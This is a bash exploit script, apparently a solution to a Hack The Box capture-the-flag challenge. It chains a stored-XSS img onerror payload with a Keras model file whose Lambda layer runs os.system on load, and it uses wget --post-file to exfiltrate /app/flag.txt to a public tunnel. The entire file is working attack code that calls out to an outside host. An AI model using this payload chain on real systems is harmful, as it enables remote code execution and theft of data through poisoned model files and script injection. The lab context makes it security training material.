#!/bin/bash

HOST="localhost:1337"
HOST="94.237.61.216:53282"
TMP_LOG=$(mktemp)
TMP_HTTP_OUT=$(mktemp -d)
# kill all background jobs when script exits
trap "trap - SIGTERM && kill -- -$$" SIGINT SIGTERM EXIT

echo + exposing port 9999 to the internet
http-server.py 9999 -B -o $TMP_HTTP_OUT & # https://github.com/orrors/cheat-sheets/blob/main/samples/http-server.py
ssh -R 80:localhost:9999 localhost.run -- --no-inject-http-proxy-headers >$TMP_LOG 2>&1 &
while ! PUBLIC_URL=$(grep 'https://.*life' -o $TMP_LOG) ; do sleep 0.1; done
echo + using $PUBLIC_URL


echo '+ building keras model'
PWN_MODEL='pwn.h5'
# use keras prebuild model with lambda layer that causes RCE when the model is loaded
# https://kb.cert.org/vuls/id/253266
# https://keras.io/api/layers/core_layers/lambda/
build_keras_model="$(cat <<EOF
from keras.layers.core import Dense, Lambda
from keras.models import Sequential
model = Sequential()
model.add(Dense(1, input_shape=(784,)))
model.add(Lambda(lambda x: __import__('os').system('wget "$PUBLIC_URL" --post-file /app/flag.txt') or x))
model.compile(loss="categorical_crossentropy", metrics=["accuracy"], optimizer="adam")
model.save('/tmp/model/$PWN_MODEL')
EOF
)"
echo "$build_keras_model" | docker run --rm --user $UID -i -v .:/tmp/model tensorflow/tensorflow:2.12.0 python &>/dev/null


echo '+ sending xss'
# inject xxs
jspayload="fetch(\`data:application/octet-stream;base64,$(base64 -w0 $PWN_MODEL)\`).then(r=>r.blob().then(b=>{a=new FormData();a.append(\`file\`,b,\`$PWN_MODEL\`);fetch(\`/api/internal/model\`,{method:\`POST\`,headers:{[\`X-SPACE-NO-CSRF\`]:1},body:a})}))"
payload=$(cat <<EOF
{
	"description": "owned",
	"image_data": "data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==",
	"prediction": "<img src='' onerror='${jspayload}' />"
}
EOF
)
curl -s -H "X-SPACE-NO-CSRF: 1" --json @<(echo -n $payload) "http://$HOST/api/complaint"

echo '+ waiting for flag to be retrieved...'
while ! grep -r 'HTB' $TMP_HTTP_OUT ; do
	sleep 1
done

rm -r $PWN_MODEL
